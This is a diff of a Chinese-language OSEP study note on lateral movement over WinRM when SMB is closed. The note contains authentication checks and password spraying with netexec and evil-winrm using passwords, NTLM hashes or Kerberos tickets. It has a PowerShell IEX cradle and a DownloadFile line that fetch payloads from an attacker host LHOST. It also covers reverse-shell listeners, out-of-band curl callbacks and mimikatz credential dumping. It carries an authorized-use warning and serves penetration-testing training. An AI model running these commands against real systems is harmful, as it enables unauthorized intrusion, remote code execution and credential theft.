@@ -1,29 +1,25 @@
-::: warning Authorized use only
-For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
+::: warning 仅限授权使用
+本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
 :::
 
-# Module 15 — WinRM
+# 模块 M15：WinRM 横移（凭据有效 · 仅 WinRM 开放）
 
-If 445 is closed, drop psexec. evil-winrm / netexec on 5985/5986.
-
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
-
-> Covers scenarios：56
-> > Prerequisites：已有一组合法凭据（密码 / NTLM 哈希 / Kerberos 票据）；目标 5985（HTTP）或 5986（HTTPS）可达；attacker box为 Kali（含 evil-winrm、netexec、impacket）或一台已控 Windows 跳板
+> 覆盖场景：56
+> > 前置依赖：已有一组合法凭据（密码 / NTLM 哈希 / Kerberos 票据）；目标 5985（HTTP）或 5986（HTTPS）可达；攻击机为 Kali（含 evil-winrm、netexec、impacket）或一台已控 Windows 跳板
 
 ---
 
-## Scenario 56：凭据有效，但目标只开放 WinRM
+## 场景 56：凭据有效，但目标只开放 WinRM
 
-**Situation**：身份是对的，但 SMB（445）不通——凡依赖 SMB 的横移执行手段（PsExec、WMIC、smbexec、经 `admin$` 放文件再触发计划任务等）全部报废；目标仅暴露 WinRM 管理端口，要用 WinRM 会话完成执行与后续横向。
+**场景回顾**：身份是对的，但 SMB（445）不通——凡依赖 SMB 的横移执行手段（PsExec、WMIC、smbexec、经 `admin$` 放文件再触发计划任务等）全部报废；目标仅暴露 WinRM 管理端口，要用 WinRM 会话完成执行与后续横向。
 
-**Assumptions**：
+**前提与假设**：
 - 我方已持有：`USER` + `PASS`（明文），或 `USER` + `NTHASH`（NTLM 哈希），或目标域内 Kerberos 票据（ccache/TGT）。
-- 目标侧：5985/5986 监听（`winrm` 服务）；该账户属于目标本地 `Administrators` 或 `Remote Management Users`（WinRM 默认只允许这两组）。域环境下还要确认用户有target本地权限，而不只是域内合法用户。
+- 目标侧：5985/5986 监听（`winrm` 服务）；该账户属于目标本地 `Administrators` 或 `Remote Management Users`（WinRM 默认只允许这两组）。域环境下还要确认用户有目标机本地权限，而不只是域内合法用户。
 - 网络：Kali→目标 5985/5986 通；目标到 Kali 的 445/139 不通（否则不需要走本场景）。若在多层跳板后，先保证端口转发/代理可达 5985/5986。
 - 必须放弃的执行方法（**SMB 不通即失效，别浪费时间**）：`psexec.py`/PsExec、`wmiexec.py`/WMIC（多数实现要写 `admin$`）、`smbexec.py`、SMB 中继、经 SMB 复制脚本文件再 `schtasks`/`sc` 触发、`admin$` 放 PowerShell 脚本。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 1. Kali 确认工具存在：
    ```bash
    which evil-winrm netexec 2>/dev/null
@@ -40,7 +36,7 @@ Switch to **中文** in the header for the original full narrative. Lab listings
    - PowerShell 内存下载执行（IEX cradles）；
    - 需要落地时走目标自己的出网下载（certutil/BITS），而不是 SMB 回拷。
 
-**Procedure**：
+**执行步骤**：
 
 1. **判断该账户在目标上是否有 WinRM 权限**（顺便确认凭据本身有效）：
    ```bash
@@ -51,7 +47,7 @@ Switch to **中文** in the header for the original full narrative. Lab listings
    # 域环境带域名（-d 后接 DOMAIN）
    netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
    ```
-   期望输出：`[+] TARGET:5985 - ... (Pwn3d!)`。`(Pwn3d!)` 表示该账户在本地管理员组；没有该标记但仍能认证时，命令可能仍可执行（Remote Management Users 非管理员也能跑 WinRM），下面步骤 3 会真正Verify。
+   期望输出：`[+] TARGET:5985 - ... (Pwn3d!)`。`(Pwn3d!)` 表示该账户在本地管理员组；没有该标记但仍能认证时，命令可能仍可执行（Remote Management Users 非管理员也能跑 WinRM），下面步骤 3 会真正验证。
 2. **（备选批量）多目标/喷密码**：见 cheat sheet `WinRM password spraying`/`Multiple targets with WinRM`：
    ```bash
    netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
@@ -90,7 +86,7 @@ Switch to **中文** in the header for the original full narrative. Lab listings
 6. **会话内投放后续 payload（无 SMB 时的两条通道）**：
    - **内存执行（首选，不落盘）**：
      ```powershell
-     # attacker box起 HTTP 投递： python3 -m http.server 80
+     # 攻击机起 HTTP 投递： python3 -m http.server 80
      IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
      # 或下载到内存再 Invoke-Expression；需要传参时用脚本块包装
      ```
@@ -114,7 +110,7 @@ Switch to **中文** in the header for the original full narrative. Lab listings
    ```
    `winrs`/WinRM 客户端在 Windows 10/Server 2016+ 默认存在；被管理端需已启用 PS-Remoting（考试靶机开 WinRM 端口即视为已启用）。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m15-winrm-auth-matrix.ps1` | 明文/哈希/Kerberos 三模板 + 失败排查清单（PowerShell Remoting 线） | `-Target`、`-User`、`-Pass`/`-NtHash`、`-Domain` |
@@ -407,13 +403,13 @@ powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/PAYLOAD.exe
 - 长命令（mimikatz sekurlsa::logonpasswords）放 evil-winrm 里易超时：一次一行、抄完再跑。
 ````
 
-**Verify**：
+**验证**：
 - `netexec winrm` 输出 `(Pwn3d!)` 或至少 `[+]`（认证成功）。
 - evil-winrm 进入会话并 `whoami` 返回预期身份。
-- 后续投放以回连为最终Verify：起监听（`nc -lvnp LPORT` / msfconsole handler），会话内执行反向连接载荷，Kali 侧收到连接。
-- 无法回连时用**带外Verify**：`Invoke-Command` 执行 `cmd /c "ping LHOST"` 并在 Kali 侧 `tcpdump -i any icmp`；或让目标 `curl http://LHOST/flag` 看投递服务器日志 404/200（参考 doc 00 的带外Verify规范）。
+- 后续投放以回连为最终验证：起监听（`nc -lvnp LPORT` / msfconsole handler），会话内执行反向连接载荷，Kali 侧收到连接。
+- 无法回连时用**带外验证**：`Invoke-Command` 执行 `cmd /c "ping LHOST"` 并在 Kali 侧 `tcpdump -i any icmp`；或让目标 `curl http://LHOST/flag` 看投递服务器日志 404/200（参考 doc 00 的带外验证规范）。
 
-**If it fails**（≥2）：
+**失败分支与备选**（≥2）：
 1. **认证被拒（`Access is denied` / 401）** → 先查账户是否在目标 `Remote Management Users`/`Administrators`；域账户则确认 `DOMAIN` 拼写与大小写、`-d` 参数；哈希线确认是 NTLM 哈希（32 hex）而非 LM 或 Kerberos 哈希。仍不行→换 Windows 跳板用 `New-PSSession` 再试，把"工具问题"与"权限问题"分开。
 2. **5985 通但 5986 才开，或反之** → 换 `-S`（HTTPS）并处理自签证书（evil-winrm 默认接受自签，若报证书错加 `--no-ssl-peer-verification` 之类选项前先确认版本）；反过来 HTTP 更省事，优先 5985。
 3. **认证成功但命令执行失败/空回显** → 账户可能在 `Remote Management Users`（非管理员）且 PowerShell 受限：先试简单命令 `cmd /c whoami`；再试 `-NoProfile` 类参数；非管理员账户的枚举/后续投放受限时，把它当"受限低权限会话"处理（收集信息为主，提权另走模块 M06）。
@@ -421,7 +417,7 @@ powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/PAYLOAD.exe
 5. **Kerberos 一直失败** → 放弃 Kerberos 走 NTLM 哈希线（`-H`），前提是明文/哈希都有；若只有票据没有密码，检查 `KRB5CCNAME`、`/etc/krb5.conf` realm、时钟（`date` 与 DC 差 <5 分钟）。
 6. **需要落地文件但目标出网也受限** → 用 evil-winrm `upload`（走 WinRM 5985 通道本身，不需要 445/80 出网）；上传到 `C:\Windows\Temp` 或用户 `%TEMP%`，注意写入权限与 Defender 扫描路径。
 
-**Exam notes / OPSEC**：
+**考试注意 / OPSEC**：
 - **先确认 SMB 真的不通**再放弃 PsExec 系——多数考生丢分是没做端口判断就在错误通道上死磕。`nmap -Pn -p445,5985 TARGET` 一次说清。
 - 5985 走 WinRM 会在目标留下 PowerShell 会话与 4624/4625 登录日志、`Microsoft-Windows-WinRM` 操作日志；哈希线（NTLM）在 DC 上留 4776。批量喷密码（步骤 2）会把账户锁风险放大，**仅在明确允许且次数受控时用**。
 - evil-winrm 的 `upload`/`download`、`scripts`/`loot` 只在会话内有效：文件走 WinRM 通道，**别**在文档/笔记里写"经 SMB 共享传文件"这类与本场景矛盾的步骤。
